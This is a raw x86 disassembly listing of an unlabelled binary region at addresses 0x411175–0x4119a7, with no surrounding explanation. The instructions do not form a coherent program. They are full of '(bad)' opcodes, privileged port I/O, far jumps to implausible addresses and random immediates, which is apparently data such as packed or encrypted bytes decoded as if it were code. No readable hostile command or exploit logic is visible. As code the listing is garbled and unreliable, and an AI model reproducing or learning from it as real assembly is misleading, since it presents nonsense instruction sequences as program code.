  411175:	mov    ecx,DWORD PTR [ebp-0x10]
  411178:	dec    edi
  411179:	xchg   DWORD PTR [ebp-0xc],eax
  41117c:	out    0x9a,al
  41117e:	popf   
  41117f:	add    edi,edx
  411181:	push   0xaef96e02
  411186:	push   esp
  411187:	or     eax,0x19feffff
  41118c:	adc    al,BYTE PTR [bx+si-0x24]
  411190:	fs (bad) 
  411192:	inc    BYTE PTR [eax]
  411194:	add    BYTE PTR [eax],al
  411196:	add    BYTE PTR [eax],al
  411198:	jmp    0xcc8124e3
  41119d:	xchg   ebx,eax
  41119e:	mov    esi,0xb21f7574
  4111a3:	mov    WORD PTR [eax],?
  4111a5:	shl    DWORD PTR [edx+0x17b091e7],0xfe
  4111ac:	lods   al,BYTE PTR ds:[esi]
  4111ad:	out    0xb0,eax
  4111af:	push   esi
  4111b0:	out    dx,al
  4111b1:	(bad)  [ebx+0x52e48545]
  4111b7:	add    esi,DWORD PTR [ecx+ebp*1+0x2]
  4111bb:	mov    ebp,ebp
  4111bd:	sub    BYTE PTR [ecx],al
  4111bf:	add    BYTE PTR [ebp+0x5a],dh
  4111c2:	lods   al,BYTE PTR ds:[esi]
  4111c3:	arpl   si,di
  4111c5:	out    dx,al
  4111c6:	rcl    ecx,cl
  4111c8:	sub    al,0xf1
  4111ca:	shr    edx,1
  4111cc:	adc    BYTE PTR [ebx],0x7c
  4111cf:	mov    edi,0x73171d01
  4111d4:	cdq    
  4111d5:	das    
  4111d6:	mov    dl,0x8a
  4111d8:	xor    dh,BYTE PTR [eax+edi*8]
  4111db:	cmp    BYTE PTR [ebx+ebx*1-0x4b],dh
  4111df:	pop    ebp
  4111e0:	aaa    
  4111e1:	and    BYTE PTR [edx],al
  4111e3:	dec    ecx
  4111e5:	pop    es
  4111e6:	or     BYTE PTR [ebx+0x238f4934],cl
  4111ec:	jno    0x41123e
  4111ee:	(bad)  
  4111ef:	and    ebp,DWORD PTR [ecx-0x13]
  4111f2:	sub    ebx,ecx
  4111f4:	adc    al,0x1c
  4111f6:	add    al,dl
  4111f8:	jns    0x411215
  4111fa:	scas   eax,DWORD PTR es:[edi]
  4111fb:	mov    al,BYTE PTR [eax]
  4111fd:	add    BYTE PTR [eax],al
  4111ff:	add    BYTE PTR [eax],al
  411201:	adc    DWORD PTR [ebp-0x211108e1],ebx
  411207:	pop    es
  411208:	and    DWORD PTR [ecx],0x20
  41120b:	mov    cl,0x55
  41120d:	mov    ds:0x72fc1b9c,al
  411212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411213:	xchg   edx,eax
  411214:	add    BYTE PTR [ebp+0x1b],dh
  411217:	add    eax,0x21ab186
  41121c:	add    dh,dh
  41121e:	add    ah,BYTE PTR [ecx+0x17]
  411221:	jae    0x4111ac
  411223:	sbb    DWORD PTR ds:0x91560275,eax
  411229:	jp     0x41123c
  41122b:	repz sbb esp,DWORD PTR [edi-0x3e]
  41122f:	call   0x3dc8dcbe
  411234:	pop    es
  411235:	icebp  
  411236:	scas   eax,DWORD PTR es:[edi]
  411237:	out    0x3,eax
  411239:	jne    0x4111c0
  41123b:	pushf  
  41123c:	fild   WORD PTR [esi-0x76e942ef]
  411242:	xor    dh,ah
  411244:	ret    
  411245:	call   0xf8e6:0x368d31d4
  41124c:	push   ebp
  41124d:	mov    al,BYTE PTR ds:0x42f803e9
  411253:	jle    0x411234
  411255:	and    BYTE PTR [ebp+0x4289169d],dh
  41125b:	aam    0xc3
  41125d:	push   0xffffff85
  41125f:	test   al,0x9c
  411261:	jb     0x41121b
  411263:	cmp    DWORD PTR [edi+0x0],ebp
  411269:	add    BYTE PTR [ebx-0x69],bl
  41126c:	loopne 0x411284
  41126e:	imul   esp,DWORD PTR [edx],0x7a4ac3f4
  411274:	and    al,0xe0
  411276:	lds    ax,DWORD PTR [ecx]
  411279:	mov    eax,0x3834f296
  41127e:	aad    0xa9
  411280:	mov    eax,ds:0x58102ac2
  411285:	push   DWORD PTR [ebp+0x2]
  411288:	jmp    0xe842dca3
  41128d:	add    esi,DWORD PTR [ebp-0x47]
  411290:	lea    edx,[eax+0xfdb1172]
  411296:	addr16 ret 0x8ae8
  41129a:	and    al,BYTE PTR [ebp+0x8b71ff]
  4112a0:	test   BYTE PTR [ecx+0x76],dh
  4112a3:	add    al,BYTE PTR [eax]
  4112a5:	mov    edi,0xf4feb827
  4112aa:	ss cmc 
  4112ac:	aas    
  4112ad:	jmp    0xf964d7b3
  4112b2:	test   eax,0xf2dd23ac
  4112b7:	push   es
  4112b8:	call   esp
  4112ba:	push   0xfffffff5
  4112bc:	aas    
  4112bd:	jmp    0xe944a3a0
  4112c2:	jbe    0x411279
  4112c4:	push   esi
  4112c5:	es add eax,0x56f4ff09
  4112cb:	cmc    
  4112cc:	aas    
  4112cd:	jmp    0x4112d2
  4112d2:	add    bh,dh
  4112d4:	lea    ecx,[ebx]
  4112d6:	(bad)  
  4112d8:	xchg   ah,al
  4112da:	jmp    0xa6371555
  4112df:	call   0xff49:0xf5e60300
  4112e6:	call   0xd842b61
  4112eb:	imul   eax,DWORD PTR [eax],0xb9242474
  4112f1:	(bad)  
  4112f2:	cld    
  4112f3:	xchg   esi,eax
  4112f4:	hlt    
  4112f5:	aas    
  4112f6:	jmp    0xbfc532f8
  4112fb:	js     0x411283
  4112fd:	mov    al,ds:0x8d0276e9
  411302:	sub    eax,0x1a4ff815
  411307:	fcom   DWORD PTR [eax]
  411309:	je     0x4112fc
  41130b:	mov    esi,esi
  41130d:	push   esp
  41130f:	adc    BYTE PTR ss:[ebx-0x77798757],al
  411316:	jmp    0xab1591
  41131b:	or     al,0xf7
  41131d:	jae    0x411327
  41131f:	jnp    0x411393
  411321:	and    ch,BYTE PTR [ebx+ebp*2]
  411324:	jb     0x411348
  411326:	and    al,0x74
  411328:	push   es
  411329:	inc    eax
  41132a:	add    ah,cl
  41132c:	pop    ebp
  41132d:	std    
  41132e:	adc    eax,0x3e1fd0
  411333:	aaa    
  411334:	push   0x44f5
  411339:	add    BYTE PTR [eax],al
  41133b:	add    BYTE PTR [eax+0x16],dh
  41133e:	inc    BYTE PTR [edi]
  411340:	int3   
  411341:	add    esi,DWORD PTR [esp+eax*1-0x41]
  411345:	ret    
  411346:	jmp    0xfda02258
  41134b:	adc    eax,0x3e1184
  411350:	pmaxsw mm7,mm5
  411353:	je     0x411334
  411355:	pop    ecx
  411356:	dec    BYTE PTR [esi]
  411358:	xor    eax,esi
  41135a:	dec    esi
  41135b:	push   0x48d
  411360:	jnp    0x4113e1
  411362:	push   es
  411363:	jmp    DWORD PTR [ecx+0x5c4012e7]
  411369:	fidivr DWORD PTR [ebx]
  41136b:	bt     esi,edx
  41136e:	mov    edi,0x427c5ce8
  411373:	and    al,0x58
  411375:	push   es
  411376:	mov    bh,0xc1
  411378:	mov    dh,0x6
  41137a:	push   DWORD PTR [ebp+0x54]
  41137d:	jl     0x4113c1
  41137f:	and    al,0x64
  411381:	ret    
  411382:	out    0x10,eax
  411384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411385:	ds leave 
  411387:	inc    ebx
  411388:	sbb    al,0x88
  41138a:	inc    edx
  41138b:	and    al,0x70
  41138d:	jnp    0x4113e1
  41138f:	and    al,0x30
  411391:	jl     0x4113dd
  411393:	and    al,0x3c
  411395:	fistp  DWORD PTR [ecx+0x21a752c]
  41139b:	jmp    0x411416
  41139d:	or     ch,0x57
  4113a0:	add    BYTE PTR [eax],al
  4113a2:	add    BYTE PTR [eax],al
  4113a4:	add    BYTE PTR [esi],ch
  4113a6:	fadd   QWORD PTR [ebx]
  4113a8:	jmp    DWORD PTR [eax+0x6d]
  4113ab:	out    dx,eax
  4113ac:	aas    
  4113ad:	jne    0x411347
  4113af:	int    0x53
  4113b1:	mov    esi,0x88ff03db
  4113b6:	lods   eax,DWORD PTR ds:[esi]
  4113b7:	repnz aas 
  4113b9:	jne    0x41140b
  4113bb:	mov    ah,0x32
  4113bd:	mov    ch,0x53
  4113bf:	xchg   esp,esp
  4113c1:	sub    bl,bl
  4113c3:	or     al,BYTE PTR [eax]
  4113c5:	sub    BYTE PTR [esi+eiz*1+0xc44c982],dl
  4113cc:	add    al,0x4d
  4113ce:	out    0xbf,al
  4113d0:	push   DWORD PTR [esi+0x55]
  4113d3:	in     al,0xe7
  4113d5:	stos   BYTE PTR es:[edi],al
  4113d6:	imul   eax,DWORD PTR [edx],0x0
  4113d9:	icebp  
  4113da:	fmul   DWORD PTR [esi-0x7ae6e0dc]
  4113e0:	inc    esp
  4113e1:	jmp    0x2ccdbe2e
  4113e6:	push   eax
  4113e7:	jmp    0x2cc27d3
  4113ec:	add    BYTE PTR [edx-0x71],dh
  4113ef:	repnz mov WORD PTR [eax+0x717413bf],?
  4113f6:	and    al,0x98
  4113f8:	pop    es
  4113f9:	lds    ebp,FWORD PTR [eax+edi*8]
  4113fc:	out    dx,eax
  4113fd:	data16 fild DWORD PTR [ebx]
  411400:	jmp    0x41147c
  411402:	cmp    al,0x98
  411404:	cmovb  ecx,edi
  411407:	(bad)  
  411408:	inc    BYTE PTR [eax]
  41140a:	add    BYTE PTR [eax],al
  41140c:	add    BYTE PTR [eax],al
  41140e:	rcl    BYTE PTR [ebx],0x11
  411411:	adc    al,0x21
  411413:	sub    edx,eax
  411415:	(bad)  
  411416:	cmp    eax,0x2bffff5a
  41141b:	add    ebp,esp
  41141d:	stos   DWORD PTR es:[edi],eax
  41141e:	sub    edx,eax
  411420:	call   0x813e9d2c
  411425:	popa   
  411426:	xchg   DWORD PTR [edx],eax
  411428:	jmp    0xeed7d6b4
  41142d:	(bad)  
  41142e:	mov    edx,0x7508aac2
  411433:	or     eax,0xc2863fcb
  411438:	call   0x5e6003f5
  41143d:	or     DWORD PTR ds:0x7903a93f,edi
  411443:	mov    ah,0x61
  411445:	cdq    
  411446:	jle    0x4113de
  411448:	pop    es
  411449:	sbb    al,0xfa
  41144b:	xchg   ecx,eax
  41144c:	call   0xb4840554
  411451:	jmp    0x4114c2
  411453:	xlat   BYTE PTR ds:[ebx]
  411454:	cwde   
  411455:	ds aaa 
  411457:	add    dh,BYTE PTR [ebx+esi*8+0x7ef897a3]
  41145e:	sub    esi,esi
  411460:	sbb    eax,0x5b1a7a99
  411465:	adc    DWORD PTR [ebx-0x7c0bfef3],ecx
  41146b:	xchg   edi,eax
  41146c:	fcom   QWORD PTR [edx]
  41146e:	add    edx,esi
  411470:	xchg   esi,eax
  411471:	adc    al,BYTE PTR [eax]
  411473:	add    BYTE PTR [eax],al
  411475:	add    BYTE PTR [eax],al
  411477:	jmp    0x6f3a0a76
  41147c:	imul   BYTE PTR [eax-0x55503cfd]
  411482:	repz pop edx
  411484:	mov    dh,0x71
  411486:	pop    ds
  411487:	dec    eax
  411488:	pop    es
  411489:	xor    DWORD PTR [ecx-0x49],eax
  41148c:	add    ah,ch
  41148e:	mov    ecx,0x97f496ef
  411493:	xchg   ebp,eax
  411494:	sbb    ch,BYTE PTR [edx]
  411496:	xchg   edi,eax
  411497:	xor    cl,BYTE PTR ds:0x91b66cff
  41149d:	pop    ss
  41149e:	repnz cmp eax,0x712acabd
  4114a4:	xchg   edi,eax
  4114a5:	setle  ch
  4114a8:	cld    
  4114a9:	mov    ah,BYTE PTR [ecx*1+0x5ee1740c]
  4114b0:	pushf  
  4114b1:	cld    
  4114b2:	xchg   BYTE PTR [edi+0x18],ah
  4114b5:	movd   DWORD PTR ds:0xe6fcfef1,mm1
  4114bc:	mov    dh,0xfe
  4114be:	hlt    
  4114bf:	fimul  WORD PTR [ebx]
  4114c1:	adc    al,0x2d
  4114c3:	loop   0x411491
  4114c5:	(bad)  
  4114c6:	mov    esi,0xe90f4305
  4114cb:	or     eax,0x6d57eb78
  4114d0:	stos   BYTE PTR es:[edi],al
  4114d1:	int3   
  4114d2:	stos   BYTE PTR es:[edi],al
  4114d3:	jbe    0x4114db
  4114d5:	push   esi
  4114d6:	jb     0x4114e5
  4114d8:	stc    
  4114d9:	jae    0x4114e3
  4114db:	add    BYTE PTR [eax],al
  4114dd:	add    BYTE PTR [eax],al
  4114df:	add    BYTE PTR [ecx+0x76e97109],cl
  4114e5:	xchg   BYTE PTR [edi+0x34c78e9d],bh
  4114eb:	mov    ecx,0x9bffc053
  4114f0:	xchg   BYTE PTR [ebx],cl
  4114f2:	je     0x4114ed
  4114f4:	add    edi,DWORD PTR [esi+0x4dd0613]
  4114fa:	call   0xfe4d9acf
  4114ff:	add    ah,BYTE PTR [esi+0xd]
  411502:	je     0x4114d9
  411504:	xchg   DWORD PTR [esi-0x697bc0f1],edx
  41150a:	pop    es
  41150b:	fimul  WORD PTR [edx+0x20]
  41150e:	adc    ch,BYTE PTR [ecx]
  411510:	jno    0x4114be
  411512:	pop    esp
  411513:	stos   DWORD PTR es:[edi],eax
  411514:	dec    ecx
  411515:	or     al,0x53
  411517:	add    bh,al
  411519:	loop   0x41150f
  41151b:	add    eax,0x41cb54
  411520:	sbb    BYTE PTR [edx-0x77],cl
  411523:	jne    0x411565
  411525:	je     0x411546
  411527:	call   0x3f89e6
  41152c:	cwde   
  41152d:	(bad)  
  41152e:	jb     0x411548
  411530:	daa    
  411531:	xor    eax,0x64fcb4e
  411536:	jne    0x411548
  411538:	repz jae 0x411549
  41153b:	mov    esp,DWORD PTR [ecx-0x2b8a02f6]
  411541:	out    0xe1,eax
  411543:	cld    
  411544:	add    BYTE PTR [eax],al
  411546:	add    BYTE PTR [eax],al
  411548:	add    BYTE PTR [ebx-0xf],dl
  41154b:	jmp    0x12b46860
  411550:	jmp    FWORD PTR [ecx-0x5600abf1]
  411556:	pop    es
  411557:	std    
  411558:	adc    eax,0x3e0a88
  41155d:	adc    bl,BYTE PTR [ebp-0x40]
  411560:	adc    BYTE PTR [esp+edx*2+0x36aec89],bl
  411567:	pop    eax
  411568:	int    0xcf
  41156a:	inc    DWORD PTR [ebx]
  41156c:	push   esi
  41156d:	daa    
  41156e:	jae    0x41157e
  411570:	je     0x41152f
  411572:	out    0x6e,eax
  411574:	jb     0x411512
  411576:	inc    DWORD PTR [ebx+0x3917e8c0]
  41157c:	xor    eax,0x41cedc
  411581:	jmp    0x48b71295
  411586:	mov    cs,WORD PTR [ebx+0x18]
  411589:	push   ebx
  41158a:	je     0x411592
  41158c:	call   0x3f1082
  411591:	daa    
  411592:	push   ss
  411593:	std    
  411594:	jne    0x41160b
  411596:	adc    DWORD PTR [edi],ecx
  411598:	je     0x411603
  41159a:	rcl    DWORD PTR [eax],cl
  41159c:	je     0x411607
  41159e:	inc    esp
  41159f:	xchg   ebp,eax
  4115a0:	pop    es
  4115a1:	xor    dh,BYTE PTR [esi]
  4115a3:	add    dl,BYTE PTR ds:0x5cb019b5
  4115a9:	aaa    
  4115aa:	xor    eax,0x5502
  4115af:	add    BYTE PTR [eax],al
  4115b1:	add    dh,ch
  4115b3:	je     0x4115cd
  4115b5:	add    al,0xad
  4115b7:	pop    esi
  4115b8:	ret    
  4115b9:	push   DWORD PTR [esi-0x35]
  4115bc:	jl     0x411632
  4115be:	gs cmc 
  4115c0:	loop   0x4115a9
  4115c2:	push   edx
  4115c3:	pop    es
  4115c4:	add    al,BYTE PTR [eax]
  4115c6:	stc    
  4115c7:	pop    eax
  4115c8:	xchg   esi,eax
  4115c9:	pop    ss
  4115ca:	scas   al,BYTE PTR es:[edi]
  4115cb:	dec    esi
  4115cc:	mov    dl,0xca
  4115ce:	sbb    DWORD PTR ss:[ebp-0x9d225f1],edx
  4115d5:	mov    al,BYTE PTR [eax+0x1]
  4115d8:	adc    DWORD PTR [ebp+edi*2-0x3f],esi
  4115dc:	mov    dh,0xfb
  4115de:	ret    0x1bbb
  4115e1:	adc    bh,BYTE PTR [edx+0x28feea4d]
  4115e7:	xor    eax,0x2520feb8
  4115ec:	pcmpeqb mm5,QWORD PTR [ebp-0x24]
  4115f0:	cmc    
  4115f1:	out    0x86,eax
  4115f3:	pop    ecx
  4115f4:	add    bl,BYTE PTR [esi+0x30]
  4115f7:	xlat   BYTE PTR ds:[ebx]
  4115f8:	idiv   bh
  4115fa:	and    DWORD PTR [eax+0x5178f51e],esp
  411600:	cmp    eax,0xb81d7542
  411605:	mov    ch,al
  411607:	pop    ss
  411608:	xchg   esi,eax
  411609:	and    BYTE PTR [ebp-0xe],bl
  41160c:	xchg   ecx,eax
  41160d:	jmp    DWORD PTR [edx-0x60]
  411610:	inc    edx
  411611:	jae    0x411690
  411613:	add    ah,BYTE PTR [edx]
  411615:	fld    DWORD PTR [eax]
  411617:	add    BYTE PTR [eax],al
  411619:	add    BYTE PTR [eax],al
  41161b:	ret    0x293d
  41161e:	add    al,0xc0
  411620:	repnz aad 0x99
  411623:	jb     0x4116a2
  411625:	sbb    edi,eax
  411627:	cmp    edx,DWORD PTR [eax+0x67f1bf0]
  41162d:	mov    ebp,0xb5f31f0f
  411632:	cdq    
  411633:	xchg   BYTE PTR [ecx],cl
  411635:	xor    esi,esp
  411637:	ror    BYTE PTR [ecx],0x1b
  41163a:	cld    
  41163b:	adc    esi,eax
  41163d:	mov    al,0xf8
  41163f:	dec    edx
  411640:	add    dh,BYTE PTR [edi]
  411642:	mov    cl,0x34
  411644:	repz call 0x7e580602
  41164a:	or     DWORD PTR [ebp+0x37],ecx
  41164d:	sub    DWORD PTR [ecx+esi*2],eax
  411650:	mov    al,0x61
  411652:	cdq    
  411653:	outs   dx,BYTE PTR ds:[esi]
  411654:	mov    es,edi
  411656:	sbb    eax,DWORD PTR [edx]
  411658:	xchg   esp,eax
  411659:	call   0xd4840f61
  41165e:	jmp    0x4115ef
  411660:	iret   
  411661:	mov    eax,0xd402373a
  411666:	repz mov ebx,0x417ad88f
  41166c:	out    dx,al
  41166d:	cmp    eax,0x2b1a7299
  411672:	or     esp,DWORD PTR [ebx-0x640bbef7]
  411678:	(bad)  
  411679:	cld    
  41167a:	push   cs
  41167b:	or     edx,esi
  41167d:	mov    dh,0xe
  41167f:	add    BYTE PTR [eax],al
  411681:	add    BYTE PTR [eax],al
  411683:	add    BYTE PTR [ecx],al
  411685:	cli    
  411686:	adc    eax,0xa8ee9ef9
  41168b:	add    ebx,DWORD PTR [ebx]
  41168d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41168e:	sub    dh,ah
  411690:	jb     0x411640
  411692:	jno    0x4116b4
  411694:	pusha  
  411695:	(bad)  
  411696:	call   DWORD PTR [eax-0x1b003b4b]
  41169c:	and    BYTE PTR [esp+esi*2-0x7],bh
  4116a0:	jmp    0xfe08:0xe03be7e1
  4116a7:	ins    DWORD PTR es:[edi],dx
  4116a8:	mov    dh,0x95
  4116aa:	pop    ss
  4116ab:	adc    bl,BYTE PTR [ecx+edi*4]
  4116ae:	retf   0x792a
  4116b1:	(bad)  
  4116b2:	movsx  ecx,BYTE PTR ds:0x11248af5
  4116b9:	or     BYTE PTR [ebp+ebx*8+0x7e],dh
  4116bd:	mov    dl,bh
  4116bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116c0:	sbb    DWORD PTR [edx+edx*1],0xffffff9e
  4116c4:	in     eax,dx
  4116c5:	lock (bad) 
  4116c7:	sbb    al,0xfd
  4116c9:	scas   al,BYTE PTR es:[edi]
  4116ca:	(bad)  
  4116cb:	adc    al,0x75
  4116cd:	or     DWORD PTR [ecx+esi*8-0x7d],esi
  4116d1:	out    dx,al
  4116d2:	not    ebp
  4116d4:	mov    dh,0x8
  4116d6:	pop    esp
  4116d7:	adc    al,0x37
  4116d9:	cmc    
  4116da:	call   DWORD PTR [ebx]
  4116dc:	pop    esi
  4116dd:	sbb    eax,0x361eecf5
  4116e2:	inc    edx
  4116e3:	jmp    0xdccbc75a
  4116e8:	add    BYTE PTR [eax],al
  4116ea:	add    BYTE PTR [eax],al
  4116ec:	add    dh,al
  4116ee:	xchg   esp,eax
  4116ef:	and    BYTE PTR [ecx-0x47],al
  4116f2:	xchg   ecx,eax
  4116f3:	(bad)  
  4116f4:	call   0xe1b45ff3
  4116f9:	mov    edi,0xb7224fcd
  4116fe:	or     BYTE PTR [ebx-0x27],dh
  411701:	imul   ecx,DWORD PTR [esi-0xf4a8ded],0xfffffffe
  411708:	xchg   esp,eax
  411709:	mov    ah,BYTE PTR [eax]
  41170b:	xor    eax,0xea087312
  411710:	cli    
  411711:	imul   ecx,DWORD PTR [esi+0x6a7b0017],0x12
  411718:	push   esi
  411719:	imul   esi,DWORD PTR [eax+0xa],0xffffffff
  41171d:	loope  0x41172a
  41171f:	std    
  411720:	adc    eax,0x3e115c
  411725:	mov    edx,0x5c14c057
  41172a:	cmp    eax,DWORD PTR [ebx]
  41172c:	cld    
  41172d:	inc    eax
  41172e:	inc    esp
  41172f:	(bad)  
  411730:	je     0x411784
  411732:	mov    esp,0xfe5d0053
  411737:	ret    0x113b
  41173a:	rcl    BYTE PTR [edx],0x40
  41173d:	or     al,0x71
  41173f:	add    al,0xb8
  411741:	(bad)  
  411742:	inc    BYTE PTR [eax+0x0]
  411745:	fistp  QWORD PTR [ecx]
  411747:	add    ecx,eax
  411749:	add    BYTE PTR [esi+edi*8+0x74],al
  41174d:	adc    bh,BYTE PTR [ebp+edi*8+0x1]
  411754:	add    BYTE PTR [eax],al
  411756:	dec    ebp
  411757:	inc    dl
  411759:	sub    esp,ecx
  41175b:	xlat   BYTE PTR ds:[ebx]
  41175c:	adc    al,BYTE PTR [eax-0x24]
  41175f:	out    dx,al
  411760:	(bad)  
  411761:	sbb    ecx,DWORD PTR [esi+ebp*8]
  411764:	into   
  411765:	and    eax,0x410491
  41176a:	lahf   
  41176b:	dec    edi
  41176c:	mov    esp,ebp
  41176e:	pop    edi
  41176f:	loop   0x411797
  411771:	not    cl
  411773:	pop    ebx
  411774:	retf   
  411775:	inc    ebx
  411776:	int3   
  411777:	call   DWORD PTR [ebp-0x75]
  41177a:	icebp  
  41177b:	or     esi,DWORD PTR [edx+0x2e]
  41177e:	inc    esp
  41177f:	sub    DWORD PTR [esi+0x0],0xffffff8c
  411783:	jg     0x411743
  411785:	je     0x4117f8
  411787:	jg     0x41177d
  411789:	je     0x411748
  41178b:	mov    al,BYTE PTR [esp+eax*1+0x64]
  41178f:	xchg   edx,eax
  411790:	std    
  411791:	push   DWORD PTR [ebp-0x10]
  411794:	xchg   BYTE PTR [edi+0x27980e01],bh
  41179a:	retf   
  41179b:	mov    ?,WORD PTR [esi+0x32f1c4d7]
  4117a1:	xchg   esi,eax
  4117a2:	bound  edx,QWORD PTR [eax]
  4117a4:	jns    0x4117ea
  4117a6:	cmp    DWORD PTR [esi+0x34a5d7c6],esp
  4117ac:	add    DWORD PTR [esi+0x4a],edx
  4117af:	push   cs
  4117b0:	adc    esi,DWORD PTR es:[ebp+0x37c8ac19]
  4117b7:	sbb    eax,0x5502
  4117bc:	add    BYTE PTR [eax],al
  4117be:	add    dh,bh
  4117c0:	sub    al,0x7f
  4117c2:	jmp    0x411821
  4117c4:	dec    edi
  4117c5:	add    eax,0x3dc3058
  4117ca:	add    al,0xc3
  4117cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117cd:	xchg   ebp,eax
  4117ce:	pop    es
  4117cf:	mov    DWORD PTR [edi],ebp
  4117d1:	sbb    dh,BYTE PTR [ebx]
  4117d3:	test   DWORD PTR [ecx],ebx
  4117d5:	add    al,BYTE PTR [ebp+esi*1+0x384e6e5]
  4117dc:	in     eax,dx
  4117dd:	loop   0x411769
  4117df:	cmp    edx,DWORD PTR ds:0x87ea4e1a
  4117e5:	or     eax,DWORD PTR [ebp+esi*4-0x72960afc]
  4117ec:	out    dx,eax
  4117ed:	jle    0x41183b
  4117ef:	lods   eax,DWORD PTR ds:[esi]
  4117f0:	dec    ecx
  4117f1:	sbb    al,BYTE PTR [ebx-0x77f4581e]
  4117f7:	cmp    ch,cl
  4117f9:	jge    0x41183f
  4117fb:	popf   
  4117fc:	dec    eax
  4117fd:	pop    ss
  4117fe:	add    BYTE PTR [ebx-0x40],cl
  411801:	cmc    
  411802:	pop    es
  411803:	sbb    BYTE PTR [ecx+0x2],0x5e
  411807:	lods   al,BYTE PTR ds:[esi]
  411808:	fiadd  DWORD PTR [esi]
  41180a:	add    BYTE PTR [eax-0x5c],al
  41180d:	push   ds
  41180e:	and    BYTE PTR [ecx+0x7115d901],0xaa
  411815:	sub    eax,eax
  411817:	add    BYTE PTR [edx],0xbf
  41181a:	js     0x41181d
  41181c:	cli    
  41181d:	xchg   esp,eax
  41181e:	rcr    BYTE PTR [edx+0x1e],1
  411821:	xchg   ebp,eax
  411822:	add    eax,DWORD PTR [eax]
  411824:	add    BYTE PTR [eax],al
  411826:	add    BYTE PTR [eax],al
  411828:	jne    0x4118a8
  41182a:	sub    BYTE PTR [edi-0x69018074],dl
  411830:	nop
  411831:	sub    DWORD PTR [esi+0x71e3c9d3],0xdb1a72c2
  41183b:	or     al,BYTE PTR [ebx+0x6]
  41183e:	imul   eax,DWORD PTR [esi+eax*8-0x11],0x42
  411843:	aam    0xc8
  411845:	ja     0x41187a
  411847:	xor    al,0xc5
  411849:	sbb    bh,dl
  41184b:	jb     0x411870
  41184d:	push   es
  41184e:	pop    edi
  41184f:	rol    DWORD PTR [edx+0x78],0x23
  411853:	xor    al,0xc2
  411855:	sbb    edi,esp
  411857:	mov    cl,0xb
  411859:	lock pushf 
  41185b:	test   DWORD PTR [edx+0x2],0xff343d37
  411862:	call   0x69581817
  411867:	sbb    BYTE PTR [edx-0x4e541cf4],bl
  41186d:	shr    eax,0xff
  411870:	inc    eax
  411871:	jns    0x411866
  411873:	sti    
  411874:	inc    esi
  411875:	rcl    DWORD PTR [eax+0x71],1
  411878:	pop    ebx
  411879:	add    ch,cl
  41187b:	jg     0x41187f
  41187d:	pop    DWORD PTR [edx]
  41187f:	add    eax,0x7087068e
  411885:	sar    BYTE PTR [ebx-0xf43001c],cl
  41188b:	sbb    eax,DWORD PTR [eax]
  41188d:	add    BYTE PTR [eax],al
  41188f:	add    BYTE PTR [eax],al
  411891:	iret   
  411892:	add    al,0xff
  411894:	xor    eax,0xb5bf7e6e
  411899:	test   DWORD PTR [ebx-0x49f240d1],ebx
  41189f:	iret   
  4118a0:	mov    eax,0x1695255e
  4118a5:	outs   dx,BYTE PTR ds:[esi]
  4118a6:	jp     0x4118ec
  4118a8:	xor    esp,ebp
  4118aa:	mov    esi,0x28b99cf
  4118af:	push   esi
  4118b0:	(bad)  
  4118b1:	cmp    DWORD PTR gs:[edx],edx
  4118b4:	test   eax,0x2bc8a476
  4118b9:	jne    0x4118bd
  4118bb:	push   ebp
  4118bc:	jb     0x411920
  4118be:	sub    bl,0x5
  4118c1:	cli    
  4118c2:	popf   
  4118c3:	sti    
  4118c4:	jmp    0xdd9d90cc
  4118c9:	in     al,0x75
  4118cb:	inc    edx
  4118cc:	xor    DWORD PTR [esi],ebp
  4118ce:	dec    esp
  4118cf:	das    
  4118d0:	push   ss
  4118d1:	xchg   BYTE PTR [edi],ah
  4118d3:	sbb    bh,BYTE PTR [edi-0x46dcfe08]
  4118d9:	lock out dx,al
  4118db:	mov    WORD PTR [ebx*2+0x651488b5],gs
  4118e2:	sbb    eax,0x270092f
  4118e7:	mov    esp,DWORD PTR [edx-0x17acb572]
  4118ed:	jbe    0x41188b
  4118ef:	add    BYTE PTR [ecx+0x621192de],0x0
  4118f6:	add    BYTE PTR [eax],al
  4118f8:	add    BYTE PTR [eax],al
  4118fa:	mov    bl,0xf4
  4118fc:	test   BYTE PTR [ecx-0x53df021b],ch
  411902:	jb     0x41191c
  411904:	add    eax,0x88d9366a
  411909:	lods   al,BYTE PTR ds:[esi]
  41190a:	jb     0x411984
  41190c:	jl     0x4118ef
  41190e:	sub    eax,0xc002fbc
  411913:	clc    
  411914:	adc    edx,DWORD PTR [edi+edi*4]
  411917:	inc    eax
  411918:	dec    BYTE PTR [edx+0x458710cb]
  41191e:	cmp    al,0x84
  411920:	inc    ebp
  411921:	and    BYTE PTR ds:0xdb8dda42,al
  411927:	xor    BYTE PTR [esi-0x1],cl
  41192a:	jns    0x411944
  41192c:	adc    DWORD PTR [eax+0x5c],eax
  41192f:	or     DWORD PTR [ebp+0x72482406],esi
  411935:	adc    al,0xcf
  411937:	out    0x13,eax
  411939:	je     0x411983
  41193b:	sub    eax,0x8528ebbe
  411940:	add    eax,0x1c7ec766
  411945:	add    DWORD PTR [eax+eax*1-0x15],ecx
  411949:	or     edi,edx
  41194b:	add    DWORD PTR [esi-0x75],esp
  41194e:	pushf  
  41194f:	sbb    bh,bh
  411951:	call   FWORD PTR [edx+eiz*2]
  411954:	xchg   DWORD PTR [ebp+0x38],eax
  411957:	xchg   BYTE PTR [ecx+0x10],al
  41195a:	fcmovnbe st,st(6)
  41195c:	mov    ecx,DWORD PTR [ebx+0x0]
  41195f:	add    BYTE PTR [eax],al
  411961:	add    BYTE PTR [eax],al
  411963:	sub    dl,BYTE PTR [edi]
  411965:	mov    esi,0x4b87dd23
  41196a:	clc    
  41196b:	data16 adc BYTE PTR [ebx-0x7eb03fb3],cl
  411972:	rcr    al,0x4f
  411975:	push   0xe6c86701
  41197a:	stc    
  41197b:	clc    
  41197c:	(bad)  
  41197d:	dec    DWORD PTR [edx+0x75f4835c]
  411983:	fsubr  DWORD PTR ds:0x871eebbe
  411989:	cmp    eax,0xcbe6828b
  41198e:	mov    ah,0x75
  411990:	sbb    al,BYTE PTR [edx]
  411992:	mov    cl,ch
  411994:	rcl    DWORD PTR [eax+0x7b197474],0x44
  41199b:	mov    eax,ds:0x4c73439e
  4119a0:	ret    
  4119a1:	add    eax,DWORD PTR [ecx]
  4119a3:	or     ebp,edi
  4119a5:	jl     0x4119eb
  4119a7:	jns    0x411939
